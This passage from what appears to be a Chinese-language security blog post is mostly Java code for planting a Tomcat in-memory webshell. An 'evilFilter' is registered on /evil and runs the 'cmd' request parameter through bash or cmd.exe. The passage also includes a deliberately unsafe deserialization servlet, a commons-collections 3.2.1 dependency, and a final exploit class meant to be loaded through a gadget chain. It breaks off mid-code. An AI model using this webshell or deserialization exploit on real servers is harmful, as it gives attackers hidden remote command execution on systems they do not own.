class="string">&quot;got request: &quot;</span> + getRequestFacadeFromThreadLocal().getClass().getName());  </span><br><span class="line">  </span><br><span class="line">        <span class="comment">// 获取standardContext  </span></span><br><span class="line">        <span class="type">RequestFacade</span> <span class="variable">requestFacade</span> <span class="operator">=</span> (RequestFacade) getRequestFacadeFromThreadLocal();  </span><br><span class="line">        <span class="type">ApplicationContextFacade</span> <span class="variable">applicationContextFacade</span> <span class="operator">=</span> (ApplicationContextFacade) requestFacade.getServletContext();  </span><br><span class="line">        <span class="type">Class</span> <span class="variable">acf</span> <span class="operator">=</span> applicationContextFacade.getClass();  </span><br><span class="line">        <span class="keyword">try</span> &#123;  </span><br><span class="line">            <span class="type">Field</span> <span class="variable">appctxfield</span> <span class="operator">=</span> acf.getDeclaredField(<span class="string">&quot;context&quot;</span>);  </span><br><span class="line">            appctxfield.setAccessible(<span class="literal">true</span>);  </span><br><span class="line">            <span class="type">ApplicationContext</span> <span class="variable">appctx</span> <span class="operator">=</span> (ApplicationContext) appctxfield.get(applicationContextFacade);  </span><br><span class="line">            <span class="type">Field</span> <span class="variable">stdctxfield</span> <span class="operator">=</span> appctx.getClass().getDeclaredField(<span class="string">&quot;context&quot;</span>);  </span><br><span class="line">            stdctxfield.setAccessible(<span class="literal">true</span>);  </span><br><span class="line">            <span class="type">StandardContext</span> <span class="variable">stdctx</span> <span class="operator">=</span> (StandardContext) stdctxfield.get(appctx);  </span><br><span class="line">            System.out.println(<span class="string">&quot;standardContext: &quot;</span> + stdctx.getClass().getName());  </span><br><span class="line">  </span><br><span class="line">            <span class="comment">// 实例化evilFilter  </span></span><br><span class="line">            <span class="type">Filter</span> <span class="variable">filter</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">evilFilter</span>();  </span><br><span class="line">  </span><br><span class="line">            <span class="comment">// 添加FilterDef  </span></span><br><span class="line">            <span class="type">FilterDef</span> <span class="variable">filterDef</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">FilterDef</span>();  </span><br><span class="line">            filterDef.setFilter(filter);  </span><br><span class="line">            filterDef.setFilterName(filter.getClass().getName());  </span><br><span class="line">            filterDef.setFilterClass(filter.getClass().getName());  </span><br><span class="line">            stdctx.addFilterDef(filterDef);  </span><br><span class="line">  </span><br><span class="line">            <span class="comment">// 添加FilterMap  </span></span><br><span class="line">            <span class="type">FilterMap</span> <span class="variable">filterMap</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">FilterMap</span>();  </span><br><span class="line">            filterMap.setFilterName(filter.getClass().getName());  </span><br><span class="line">            filterMap.addURLPattern(<span class="string">&quot;/evil&quot;</span>);  </span><br><span class="line">            filterMap.addServletName(<span class="string">&quot;&quot;</span>);  </span><br><span class="line">            stdctx.addFilterMap(filterMap);  </span><br><span class="line">  </span><br><span class="line">            <span class="comment">// 实例化ApplicationFilterConfig  </span></span><br><span class="line">            <span class="type">Class</span> <span class="variable">filterConfigClass</span> <span class="operator">=</span> Class.forName(<span class="string">&quot;org.apache.catalina.core.ApplicationFilterConfig&quot;</span>);  </span><br><span class="line">            <span class="type">Constructor</span> <span class="variable">constructor</span> <span class="operator">=</span> filterConfigClass.getDeclaredConstructor(Context.class, FilterDef.class);  </span><br><span class="line">            constructor.setAccessible(<span class="literal">true</span>);  </span><br><span class="line">            <span class="type">ApplicationFilterConfig</span> <span class="variable">filterConfig</span> <span class="operator">=</span> (ApplicationFilterConfig) constructor.newInstance(stdctx, filterDef);  </span><br><span class="line">  </span><br><span class="line">            <span class="comment">// 添加FilterConfig  </span></span><br><span class="line">            <span class="type">Field</span> <span class="variable">filterConfigsField</span> <span class="operator">=</span> stdctx.getClass().getDeclaredField(<span class="string">&quot;filterConfigs&quot;</span>);  </span><br><span class="line">            filterConfigsField.setAccessible(<span class="literal">true</span>);  </span><br><span class="line">            Map&lt;String,ApplicationFilterConfig&gt; filterConfigs = (HashMap) filterConfigsField.get(stdctx);  </span><br><span class="line">            filterConfigs.put(filter.getClass().getName(), filterConfig);  </span><br><span class="line">  </span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception e) &#123;  </span><br><span class="line">            e.printStackTrace();  </span><br><span class="line">        &#125;  </span><br><span class="line">        resp.getWriter().write(<span class="string">&quot;hello world&quot;</span>);  </span><br><span class="line">    &#125;  </span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">evilFilter</span> <span class="keyword">implements</span> <span class="title class_">Filter</span> &#123;  </span><br><span class="line">        <span class="meta">@Override</span>  </span><br><span class="line">        <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">init</span><span class="params">(FilterConfig filterConfig)</span> <span class="keyword">throws</span> ServletException &#123;  </span><br><span class="line">            Filter.<span class="built_in">super</span>.init(filterConfig);  </span><br><span class="line">        &#125;  </span><br><span class="line">        <span class="meta">@Override</span>  </span><br><span class="line">        <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">doFilter</span><span class="params">(ServletRequest request, ServletResponse response, FilterChain chain)</span> <span class="keyword">throws</span> IOException, ServletException &#123;  </span><br><span class="line">            <span class="type">String</span> <span class="variable">commmand</span> <span class="operator">=</span> request.getParameter(<span class="string">&quot;cmd&quot;</span>);  </span><br><span class="line">            <span class="keyword">try</span> &#123;  </span><br><span class="line">  </span><br><span class="line">                <span class="type">String</span> <span class="variable">output</span> <span class="operator">=</span> executeCmd(commmand);  </span><br><span class="line">                response.getWriter().println(output);  </span><br><span class="line">                System.out.println(output);  </span><br><span class="line">            &#125; <span class="keyword">catch</span> (Exception e) &#123;  </span><br><span class="line">                e.printStackTrace();  </span><br><span class="line">            &#125;  </span><br><span class="line"><span class="comment">//            chain.doFilter(request, response);  </span></span><br><span class="line">        &#125;  </span><br><span class="line">        <span class="meta">@Override</span>  </span><br><span class="line">        <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">destroy</span><span class="params">()</span> &#123;  </span><br><span class="line">            Filter.<span class="built_in">super</span>.destroy();  </span><br><span class="line">        &#125;  </span><br><span class="line">    &#125;  </span><br><span class="line">      </span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> ServletRequest <span class="title function_">getRequestFacadeFromThreadLocal</span><span class="params">()</span> &#123;  </span><br><span class="line">        <span class="keyword">try</span> &#123;  </span><br><span class="line">            <span class="comment">// 设置WRAP_SAME_OBJECT为true  </span></span><br><span class="line">            <span class="type">Class</span> <span class="variable">clazz1</span> <span class="operator">=</span> Class.forName(<span class="string">&quot;org.apache.catalina.core.ApplicationDispatcher&quot;</span>);  </span><br><span class="line">            <span class="type">Field</span> <span class="variable">boolfield</span> <span class="operator">=</span> clazz1.getDeclaredField(<span class="string">&quot;WRAP_SAME_OBJECT&quot;</span>);  </span><br><span class="line">            boolfield.setAccessible(<span class="literal">true</span>);  </span><br><span class="line">            <span class="type">Field</span> <span class="variable">modifiersField</span> <span class="operator">=</span> Field.class.getDeclaredField(<span class="string">&quot;modifiers&quot;</span>);  </span><br><span class="line">            modifiersField.setAccessible(<span class="literal">true</span>);  </span><br><span class="line">            modifiersField.setInt(boolfield, boolfield.getModifiers() &amp; ~Modifier.FINAL);  </span><br><span class="line">            boolfield.set(<span class="literal">null</span>, <span class="literal">true</span>);  </span><br><span class="line">            <span class="type">Boolean</span> <span class="variable">newValue</span> <span class="operator">=</span> (Boolean) boolfield.get(<span class="literal">null</span>);  </span><br><span class="line">            System.out.println(<span class="string">&quot;WRAP_SAME_OBJECT: &quot;</span>);  </span><br><span class="line">            System.out.println(newValue);  </span><br><span class="line">  </span><br><span class="line">            <span class="type">Class</span> <span class="variable">clazz</span> <span class="operator">=</span> Class.forName(<span class="string">&quot;org.apache.catalina.core.ApplicationFilterChain&quot;</span>);  </span><br><span class="line">            <span class="type">Field</span> <span class="variable">lastServicedRequest</span> <span class="operator">=</span> clazz.getDeclaredField(<span class="string">&quot;lastServicedRequest&quot;</span>);  </span><br><span class="line">            lastServicedRequest.setAccessible(<span class="literal">true</span>);  </span><br><span class="line">            modifiersField.setInt(lastServicedRequest, lastServicedRequest.getModifiers() &amp; ~Modifier.FINAL);  </span><br><span class="line">  </span><br><span class="line">            <span class="type">Field</span> <span class="variable">lastServicedResponse</span> <span class="operator">=</span> clazz.getDeclaredField(<span class="string">&quot;lastServicedResponse&quot;</span>);  </span><br><span class="line">            lastServicedResponse.setAccessible(<span class="literal">true</span>);  </span><br><span class="line">            modifiersField.setInt(lastServicedResponse, lastServicedResponse.getModifiers() &amp; ~Modifier.FINAL);  </span><br><span class="line">  </span><br><span class="line">            <span class="comment">// 设置lastServicedRequest和lastServicedResponse为ThreadLocal  </span></span><br><span class="line">            <span class="keyword">if</span>(lastServicedRequest.get(<span class="literal">null</span>) == <span class="literal">null</span> || lastServicedResponse.get(<span class="literal">null</span>) == <span class="literal">null</span>)&#123;  </span><br><span class="line">                ThreadLocal&lt;ServletRequest&gt; lastServicedRequestValue = <span class="keyword">new</span> <span class="title class_">ThreadLocal</span>&lt;&gt;();  </span><br><span class="line">                ThreadLocal&lt;ServletRequest&gt; lastServicedResponseValue = <span class="keyword">new</span> <span class="title class_">ThreadLocal</span>&lt;&gt;();  </span><br><span class="line">                lastServicedRequest.set(<span class="literal">null</span>, lastServicedRequestValue);  </span><br><span class="line">                lastServicedResponse.set(<span class="literal">null</span>, lastServicedResponseValue);  </span><br><span class="line">                <span class="keyword">return</span> lastServicedRequestValue.get();  </span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;  </span><br><span class="line">                <span class="comment">// 获取ThreadLocal中的ServletRequest  </span></span><br><span class="line">                ThreadLocal&lt;ServletRequest&gt; tl = (ThreadLocal&lt;ServletRequest&gt;) lastServicedRequest.get(<span class="literal">null</span>);  </span><br><span class="line">                <span class="keyword">return</span> tl.get();  </span><br><span class="line">            &#125;  </span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception e) &#123;  </span><br><span class="line">            <span class="keyword">return</span> <span class="literal">null</span>;  </span><br><span class="line">        &#125;  </span><br><span class="line">    &#125;  </span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> String <span class="title function_">executeCmd</span><span class="params">(String multiLineCommand)</span> &#123;  </span><br><span class="line">        <span class="type">StringBuilder</span> <span class="variable">output</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">StringBuilder</span>();  </span><br><span class="line">        <span class="keyword">try</span> &#123;  </span><br><span class="line">            <span class="type">String</span> <span class="variable">os</span> <span class="operator">=</span> System.getProperty(<span class="string">&quot;os.name&quot;</span>).toLowerCase();  </span><br><span class="line">            <span class="type">String</span> <span class="variable">shell</span> <span class="operator">=</span> os.contains(<span class="string">&quot;win&quot;</span>) ? <span class="string">&quot;cmd.exe&quot;</span> : <span class="string">&quot;/bin/bash&quot;</span>;  </span><br><span class="line">            <span class="type">String</span> <span class="variable">shellOption</span> <span class="operator">=</span> os.contains(<span class="string">&quot;win&quot;</span>) ? <span class="string">&quot;/c&quot;</span> : <span class="string">&quot;-c&quot;</span>;  </span><br><span class="line">  </span><br><span class="line">            <span class="type">ProcessBuilder</span> <span class="variable">builder</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ProcessBuilder</span>(shell, shellOption, multiLineCommand);  </span><br><span class="line">            builder.redirectErrorStream(<span class="literal">true</span>);  </span><br><span class="line">            <span class="type">Process</span> <span class="variable">process</span> <span class="operator">=</span> builder.start();  </span><br><span class="line">  </span><br><span class="line">            <span class="keyword">try</span> (<span class="type">BufferedReader</span> <span class="variable">reader</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">BufferedReader</span>(  </span><br><span class="line">                    <span class="keyword">new</span> <span class="title class_">InputStreamReader</span>(process.getInputStream()))) &#123;  </span><br><span class="line">                String line;  </span><br><span class="line">                <span class="keyword">while</span> ((line = reader.readLine()) != <span class="literal">null</span>) &#123;  </span><br><span class="line">                    output.append(line).append(<span class="string">&quot;\n&quot;</span>);  </span><br><span class="line">                &#125;  </span><br><span class="line">            &#125;  </span><br><span class="line">  </span><br><span class="line">            <span class="type">int</span> <span class="variable">exitCode</span> <span class="operator">=</span> process.waitFor();  </span><br><span class="line">            output.append(<span class="string">&quot;Process exited with code: &quot;</span>).append(exitCode).append(<span class="string">&quot;\n&quot;</span>);  </span><br><span class="line">  </span><br><span class="line">        &#125; <span class="keyword">catch</span> (IOException | InterruptedException e) &#123;  </span><br><span class="line">            output.append(<span class="string">&quot;Error: &quot;</span>).append(e.getMessage()).append(<span class="string">&quot;\n&quot;</span>);  </span><br><span class="line">        &#125;  </span><br><span class="line">  </span><br><span class="line">        <span class="keyword">return</span> output.toString();  </span><br><span class="line">    &#125;  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>成功打入内存马<br><img src="https://images-1321971079.cos.ap-beijing.myqcloud.com/blog-images/20250729212118.png" alt="image.png"></p><p>这里是直接写了个Servlet来写入内存马的, 我们也可以结合反序列化<br>先写一个反序列化入口</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> org.n4c1.Servlets;  </span><br><span class="line">  </span><br><span class="line"><span class="keyword">import</span> javax.servlet.ServletException;  </span><br><span class="line"><span class="keyword">import</span> javax.servlet.annotation.WebServlet;  </span><br><span class="line"><span class="keyword">import</span> javax.servlet.http.HttpServlet;  </span><br><span class="line"><span class="keyword">import</span> javax.servlet.http.HttpServletRequest;  </span><br><span class="line"><span class="keyword">import</span> javax.servlet.http.HttpServletResponse;  </span><br><span class="line"><span class="keyword">import</span> java.io.ByteArrayInputStream;  </span><br><span class="line"><span class="keyword">import</span> java.io.IOException;  </span><br><span class="line"><span class="keyword">import</span> java.io.ObjectInputStream;  </span><br><span class="line"><span class="keyword">import</span> java.util.Base64;  </span><br><span class="line">  </span><br><span class="line"><span class="meta">@WebServlet(&quot;/unser&quot;)</span>  </span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">UnserialServlet</span> <span class="keyword">extends</span> <span class="title class_">HttpServlet</span> &#123;  </span><br><span class="line">    <span class="meta">@Override</span>  </span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">doPost</span><span class="params">(HttpServletRequest request, HttpServletResponse response)</span> <span class="keyword">throws</span>  IOException &#123;  </span><br><span class="line">        <span class="type">String</span> <span class="variable">paylod</span> <span class="operator">=</span> request.getParameter(<span class="string">&quot;payload&quot;</span>);  </span><br><span class="line">        System.out.println(paylod);  </span><br><span class="line">        <span class="type">byte</span>[] decode = Base64.getDecoder().decode(paylod);  </span><br><span class="line">  </span><br><span class="line">        <span class="type">ObjectInputStream</span> <span class="variable">ois</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(<span class="keyword">new</span> <span class="title class_">ByteArrayInputStream</span>(decode));  </span><br><span class="line">        <span class="type">Object</span> <span class="variable">obj</span> <span class="operator">=</span> <span class="literal">null</span>;  </span><br><span class="line">        <span class="keyword">try</span> &#123;  </span><br><span class="line">            obj = ois.readObject();  </span><br><span class="line">        &#125; <span class="keyword">catch</span> (ClassNotFoundException e) &#123;  </span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">RuntimeException</span>(e);  </span><br><span class="line">        &#125;  </span><br><span class="line">        ois.close();  </span><br><span class="line">  </span><br><span class="line">        response.getWriter().println(obj.toString());  </span><br><span class="line">  </span><br><span class="line">    &#125;  </span><br><span class="line">  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>引入cc依赖</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span>  </span><br><span class="line">    <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>commons-collections<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span>  </span><br><span class="line">    <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>commons-collections<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span>  </span><br><span class="line">    <span class="tag">&lt;<span class="name">version</span>&gt;</span>3.2.1<span class="tag">&lt;/<span class="name">version</span>&gt;</span>  </span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br></pre></td></tr></table></figure><h5 id="最终exp"><a href="#最终exp" class="headerlink" title="最终exp"></a>最终exp</h5><p>最终内存马, 配合cc链加载两次此类即可写入内存马</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.DOM;  </span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.TransletException;  </span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;  </span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xml.internal.dtm.DTMAxisIterator;  </span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xml.internal.serializer.SerializationHandler;  </span><br><span class="line"><span class="keyword">import</span> org.apache.catalina.Context;  </span><br><span class="line"><span class="keyword">import</span> org.apache.catalina.connector.RequestFacade;  </span><br><span class="line"><span class="keyword">import</span> org.apache.catalina.core.ApplicationContext;  </span><br><span class="line"><span class="keyword">import</span> org.apache.catalina.core.ApplicationContextFacade;  </span><br><span class="line"><span class="keyword">import</span> org.apache.catalina.core.ApplicationFilterConfig;  </span><br><span class="line"><span class="keyword">import</span> org.apache.catalina.core.StandardContext;  </span><br><span class="line"><span class="keyword">import</span> org.apache.tomcat.util.descriptor.web.FilterDef;  </span><br><span class="line"><span class="keyword">import</span> org.apache.tomcat.util.descriptor.web.FilterMap;  </span><br><span class="line">  </span><br><span class="line"><span class="keyword">import</span> javax.servlet.*;  </span><br><span class="line"><span class="keyword">import</span> java.io.BufferedReader;  </span><br><span class="line"><span class="keyword">import</span> java.io.IOException;  </span><br><span class="line"><span class="keyword">import</span> java.io.InputStreamReader;  </span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Constructor;  </span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;  </span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Modifier;  </span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;  </span><br><span class="line"><span class="keyword">import</span> java.util.Map;  </span><br><span class="line">  </span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">filterShell</span> <span class="keyword">extends</span> <span class="title class_">AbstractTranslet</span> <span class="keyword">implements</span> <span class="title class_">Filter</span> &#123;  </span><br><span class="line">  </span><br><span class="line">    <span class="keyword">static</span> &#123;  </span><br><span class="line">        <span class="keyword">try</span> &#123;  </span><br><span class="line">            <span class="comment">// 获取standardContext  </span></span><br><span class="line">            <span class="type">RequestFacade</span> <span class="variable">requestFacade</span> <span class="operator">=</span> (RequestFacade) getRequestFacadeFromThreadLocal();  </span><br><span class="line">            <span class="keyword">if</span> (requestFacade != <span class="literal">null</span>) &#123;  </span><br><span class="line">                <span class="type">ApplicationContextFacade</span> <span class="variable">applicationContextFacade</span> <span class="operator">=</span> (ApplicationContextFacade) requestFacade.getServletContext();  </span><br><span class="line">                <span class="type">Class</span> <span class="variable">acf</span> <span class="operator">=</span> applicationContextFacade.getClass();  </span><br><span class="line">                <span class="type">Field</span> <span class="variable">appctxfield</span> <span class="operator">=</span> acf.getDeclaredField(<span class="string">&quot;context&quot;</span>);  </span><br><span class="line">                appctxfield.setAccessible(<span class="literal">true</span>);  </span><br><span class="line">                <span class="type">ApplicationContext</span> <span class="variable">appctx</span> <span class="operator">=</span> (ApplicationContext) appctxfield.get(applicationContextFacade);  </span><br><span class="line">                <span class="type">Field</span> <span class="variable">stdctxfield</span> <span class="operator">=</span> appctx.getClass().getDeclaredField(<span class="string">&quot;context&quot;</span>);  </span><br><span class="line">                stdctxfield.setAccessible(<span class="literal">true</span>);  </span><br><span class="line">                <span class="type">StandardContext</span> <span class="variable">stdctx</span> <span class="operator">=</span> (StandardContext) stdctxfield.get(appctx);  </span><br><span class="line">  </span><br><span class="line">                <span class="comment">// 实例化evilFilter  </span></span><br><span class="line">                <span class="type">Filter</span> <span class="variable">filter</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">filterShell</span>();  </span><br><span class="line">  </span><br><span class="line">                <span class="comment">// 添加FilterDef  </span></span><br><span class="line">                <span class="type">FilterDef</span> <span class="variable">filterDef</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">FilterDef</span>();  </span><br><span class="line">                filterDef.setFilter(filter);  </span><br><span class="line">                filterDef.setFilterName(filter.getClass().getName());  </span><br><span class="line">                filterDef.setFilterClass(filter.getClass().getName());  </span><br><span class="line">                stdctx.addFilterDef(filterDef);  </span><br><span class="line">  </span><br><span class="line">                <span class="comment">// 添加FilterMap  </span></span><br><span class="line">                <span class="type">FilterMap</span> <span class="variable">filterMap</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">FilterMap</span>();  </span><br><span class="line">                filterMap.setFilterName(filter.getClass().getName());  </span><br><span class="line">                filterMap.addURLPattern(<span class="string">&quot;/evil&quot;</span>);  </span><br><span class="line">                filterMap.addServletName(<span class="string">&quot;&quot;</span>);  </span><br><span class="line">                stdctx.addFilterMap(filterMap);  </span><br><span class="line">  </span><br><span class="line">  </span><br><span class="line">                <span class="comment">// 实例化ApplicationFilterConfig  </span></span><br><span class="line">                <span class="type">Class</span> <span class="variable">filterConfigClass</span> <span class="operator">=</span> Class.forName(<span class="string">&quot;org.apache.catalina.core.ApplicationFilterConfig&quot;</span>);  </span><br><span class="line">                <span class="type">Constructor</span> <span class="variable">constructor</span> <span class="operator">=</span> filterConfigClass.getDeclaredConstructor(Context.class, FilterDef.class);  </span><br><span class="line">                constructor.setAccessible(<span class="literal">true</span>);  </span><br><span class="line">                <span class="type">ApplicationFilterConfig</span> <span class="variable">filterConfig</span> <span class="operator">=</span> (ApplicationFilterConfig) constructor.newInstance(stdctx, filterDef);  </span><br><span class="line">  </span><br><span class="line">                <span class="comment">// 添加FilterConfig  </span></span><br><span class="line">                <span class="type">Field</span> <span class="variable">filterConfigsField</span> <span class="operator">=</span> stdctx.getClass().getDeclaredField(<span class="string">&quot;filterConfigs&quot;</span>);  </span><br><span class="line">                filterConfigsField.setAccessible(<span class="literal">true</span>);  </span><br><span class="line">                Map&lt;String,ApplicationFilterConfig&gt; filterConfigs = (HashMap) filterConfigsField.get(stdctx);  </span><br><span class="line">                filterConfigs.put(filter.getClass().getName(), filterConfig);  </span><br><span class="line">            &#125;  </span><br><span class="line">  </span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception e) &#123;  </span><br><span class="line">            System.out.println(<span class="string">&quot;Error: &quot;</span> + e.getMessage());  </span><br><span class="line">            e.printStackTrace();  </span><br><span class="line">        &#125;  </span><br><span class="line">    &#125;  </span><br><span class="line">  </span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;  </span><br><span class="line">        System.out.println(<span class="string">&quot;evil!&quot;</span>);  </span><br><span class="line">    &#125;  </span><br><span class="line">  </span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> ServletRequest <span class="title function_">getRequestFacadeFromThreadLocal</span><span class="params">()</span> &#123;  </span><br><span class="line">        <span class="keyword">try</span> &#123;  </span><br><span class="line">            <span class="comment">// 设置WRAP_SAME_OBJECT为true  </span></span><br><span class="line">            <span class="type">Class</span> <span class="variable">clazz1</span> <span class="operator">=</span> Class.forName(<span class="string">&quot;org.apache.catalina.core.ApplicationDispatcher&quot;</span>);  </span><br><span class="line">            <span class="type">Field</span> <span class="variable">boolfield</span> <span class="operator">=</span> clazz1.getDeclaredField(<span class="string">&quot;WRAP_SAME_OBJECT&quot;</span>);  </span><br><span class="line">            boolfield.setAccessible(<span class="literal">true</span>);  </span><br><span class="line">            <span class="type">Field</span> <span class="variable">modifiersField</span> <span class="operator">=</span> Field.class.getDeclaredField(<span class="string">&quot;modifiers&quot;</span>);  </span><br><span class="line">            modifiersField.setAccessible(<span class="literal">true</span>);  </span><br><span class="line">            modifiersField.setInt(boolfield, boolfield.getModifiers() &amp; ~Modifier.FINAL);  </span><br><span class="line">            boolfield.set(<span class="literal">null</span>, <span class="literal">true</span>);  </span><br><span class="line">            <span class="type">Boolean</span> <span class="variable">newValue</span> <span class="operator">=</span> (Boolean) boolfield.get(<span class="literal">null</span>);  </span><br><span class="line">            System.out.println(<span class="string">&quot;WRAP_SAME_OBJECT: &quot;</span>);  </span><br><span class="line">            System.out.println(newValue);  </span><br><span class="line">  </span><br><span class="line">            <span class="type">Class</span> <span class="variable">clazz</span> <span class="operator">=</span> Class.forName(<span class="string">&quot;org.apache.catalina.core.ApplicationFilterChain&quot;</span>);  </span><br><span class="line">            <span class="type">Field</span> <span class="variable">lastServicedRequest</span> <span class="operator">=</span> 